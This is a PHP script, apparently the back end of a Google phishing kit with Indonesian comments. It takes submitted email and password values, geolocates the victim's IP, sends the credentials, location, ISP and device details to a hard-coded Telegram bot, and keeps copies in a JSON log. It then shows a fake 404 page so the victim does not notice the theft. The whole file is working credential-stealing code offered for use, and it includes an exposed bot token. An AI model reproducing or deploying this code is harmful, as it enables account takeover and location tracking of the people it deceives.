<?php
// ========== KONFIGURASI TELEGRAM ==========
$botToken = "8617014310:AAEidb6kIIlM4QLyoAMm5FMGskMSutKO6aU";
$chatId = "8753510792";

// ========== AMBIL DATA DARI FORM ==========
$email = isset($_POST['email']) ? trim($_POST['email']) : 'Tidak ada email';
$password = isset($_POST['password']) ? trim($_POST['password']) : 'Tidak ada password';

// ========== AMBIL INFORMASI TEKNIS ==========
$ipAddress = $_SERVER['HTTP_CF_CONNECTING_IP'] ?? $_SERVER['HTTP_X_FORWARDED_FOR'] ?? $_SERVER['REMOTE_ADDR'] ?? 'Tidak diketahui';
$userAgent = $_SERVER['HTTP_USER_AGENT'] ?? 'Tidak diketahui';
$requestTime = date('Y-m-d H:i:s');
$timezone = date_default_timezone_get();

// ========== AMBIL GEOLOKASI DARI IP (pakai ip-api.com) ==========
$geoData = [];
$locationString = 'Tidak diketahui';
$mapsLink = '#';
$latitude = null;
$longitude = null;

$geoResponse = @file_get_contents("http://ip-api.com/json/{$ipAddress}?fields=status,country,city,region,lat,lon,isp,org,as,mobile,proxy,query");
if ($geoResponse !== false) {
    $geoData = json_decode($geoResponse, true);
    if (isset($geoData['status']) && $geoData['status'] == 'success') {
        $country = $geoData['country'] ?? 'Tidak diketahui';
        $city = $geoData['city'] ?? 'Tidak diketahui';
        $region = $geoData['region'] ?? 'Tidak diketahui';
        $isp = $geoData['isp'] ?? 'Tidak diketahui';
        $org = $geoData['org'] ?? 'Tidak diketahui';
        $as = $geoData['as'] ?? 'Tidak diketahui';
        $latitude = $geoData['lat'] ?? null;
        $longitude = $geoData['lon'] ?? null;
        
        $locationString = "{$city}, {$region}, {$country} (ISP: {$isp})";
        if ($latitude && $longitude) {
            $mapsLink = "https://www.google.com/maps?q={$latitude},{$longitude}";
        }
    }
}

// ========== DETEKSI PERANGKAT ==========
function detectDevice($ua) {
    if (stripos($ua, 'iPhone') !== false) return '📱 iPhone';
    if (stripos($ua, 'iPad') !== false) return '📱 iPad';
    if (stripos($ua, 'Android') !== false) return '🤖 Android';
    if (stripos($ua, 'Windows') !== false) {
        if (stripos($ua, 'Phone') !== false) return '📱 Windows Phone';
        return '💻 Windows PC';
    }
    if (stripos($ua, 'Mac') !== false) return '🍎 Mac';
    if (stripos($ua, 'Linux') !== false) return '🐧 Linux';
    return '❓ Perangkat tidak dikenal';
}

$device = detectDevice($userAgent);

// ========== DETEKSI APAKAH PAKAI PROXY/VPN ==========
$proxyStatus = (isset($geoData['proxy']) && $geoData['proxy'] == true) ? '⚠️ Terdeteksi Proxy/VPN' : '✅ Kemungkinan IP asli';

// ========== FORMAT PESAN TELEGRAM ==========
$telegramMessage = "🎭 *GOOGLE PHISHING - DATA MASUK* 🎭\n";
$telegramMessage .= "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n";
$telegramMessage .= "📅 *Waktu Kejadian:* {$requestTime}\n";
$telegramMessage .= "🌍 *Zona Waktu:* {$timezone}\n\n";

$telegramMessage .= "🔐 *KREDENSIAL LOGIN*\n";
$telegramMessage .= "📧 *Email:* `{$email}`\n";
$telegramMessage .= "🔑 *Password:* `{$password}`\n\n";

$telegramMessage .= "🌐 *INFORMASI JARINGAN*\n";
$telegramMessage .= "🖥️ *IP Address:* `{$ipAddress}`\n";
$telegramMessage .= "📡 *ISP:* " . ($geoData['isp'] ?? 'Tidak diketahui') . "\n";
$telegramMessage .= "🏢 *Organisasi:* " . ($geoData['org'] ?? 'Tidak diketahui') . "\n";
$telegramMessage .= "🔗 *ASN:* " . ($geoData['as'] ?? 'Tidak diketahui') . "\n";
$telegramMessage .= "{$proxyStatus}\n\n";

$telegramMessage .= "📍 *LOKASI GEOGRAFIS*\n";
$telegramMessage .= "🗺️ *Negara:* " . ($geoData['country'] ?? 'Tidak diketahui') . "\n";
$telegramMessage .= "🏙️ *Kota:* " . ($geoData['city'] ?? 'Tidak diketahui') . "\n";
$telegramMessage .= "🗺️ *Region:* " . ($geoData['region'] ?? 'Tidak diketahui') . "\n";

if ($latitude && $longitude) {
    $telegramMessage .= "🎯 *Koordinat:* {$latitude}, {$longitude}\n";
    $telegramMessage .= "📍 *Google Maps:* [Klik untuk lihat peta]({$mapsLink})\n\n";
} else {
    $telegramMessage .= "📍 *Peta:* Tidak tersedia\n\n";
}

$telegramMessage .= "📱 *INFORMASI PERANGKAT*\n";
$telegramMessage .= "{$device}\n";
$telegramMessage .= "🔧 *User Agent:* `{$userAgent}`\n";

// ========== KIRIM PESAN KE TELEGRAM ==========
$sendMessageUrl = "https://api.telegram.org/bot{$botToken}/sendMessage";
$postData = [
    'chat_id' => $chatId,
    'text' => $telegramMessage,
    'parse_mode' => 'Markdown',
    'disable_web_page_preview' => false
];

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $sendMessageUrl);
curl_setopt($ch, CURLOPT_POST, true);
curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($postData));
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
$response = curl_exec($ch);
curl_close($ch);

// ========== KIRIM LOKASI KE TELEGRAM (jika ada koordinat) ==========
if ($latitude && $longitude) {
    $sendLocationUrl = "https://api.telegram.org/bot{$botToken}/sendLocation";
    $locData = [
        'chat_id' => $chatId,
        'latitude' => $latitude,
        'longitude' => $longitude
    ];
    $chLoc = curl_init();
    curl_setopt($chLoc, CURLOPT_URL, $sendLocationUrl);
    curl_setopt($chLoc, CURLOPT_POST, true);
    curl_setopt($chLoc, CURLOPT_POSTFIELDS, http_build_query($locData));
    curl_setopt($chLoc, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($chLoc, CURLOPT_SSL_VERIFYPEER, false);
    curl_exec($chLoc);
    curl_close($chLoc);
}

// ========== SIMPAN BACKUP KE FILE JSON ==========
$backupData = [
    'timestamp' => $requestTime,
    'email' => $email,
    'password' => $password,
    'ip' => $ipAddress,
    'user_agent' => $userAgent,
    'device' => $device,
    'location' => $geoData,
    'maps_link' => $mapsLink
];

$backupFile = 'logs_' . date('Y-m-d') . '.json';
$existingData = [];
if (file_exists($backupFile)) {
    $existingData = json_decode(file_get_contents($backupFile), true) ?? [];
}
$existingData[] = $backupData;
file_put_contents($backupFile, json_encode($existingData, JSON_PRETTY_PRINT));

// ========== REDIRECT KE HALAMAN 404 ==========
header("HTTP/1.0 404 Not Found");
?>
<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <title>404 Not Found</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #f1f1f1;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }
        .error-container {
            text-align: center;
            background: white;
            padding: 40px;
            border-radius: 8px;
            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
        }
        h1 {
            font-size: 72px;
            color: #e74c3c;
            margin-bottom: 16px;
        }
        p {
            font-size: 18px;
            color: #555;
        }
    </style>
</head>
<body>
    <div class="error-container">
        <h1>404</h1>
        <p>The requested URL was not found on this server.</p>
        <p>That's all we know.</p>
    </div>
</body>
</html>
<?php
exit();
?>
